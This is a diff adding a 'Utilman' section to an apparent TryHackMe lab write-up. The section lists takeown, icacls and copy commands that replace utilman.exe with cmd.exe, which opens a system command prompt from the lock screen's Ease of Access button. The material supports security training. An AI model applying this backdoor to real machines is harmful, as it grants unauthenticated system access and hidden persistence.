@@ -41,3 +41,23 @@ THM{BREAKING_THROUGH_LOGIN}
 
 # Utilman
 1. Started this room's machine
+2. `takeown /f c:\Windows\System32\utilman.exe`
+```PowerShell
+```
+3. `icacls C:\Windows\System32\utilman.exe /grant Administrator:F`
+```PowerShell
+```
+4. `copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe`
+```PowerShell
+```
+5. Lock your screen and click on the "**Ease of Access**" button
+
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt1.png)
+
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt.2.png)
+
+![]()
+
+7. `C:\flags\flag15.exe`
+```PowerShell
+```
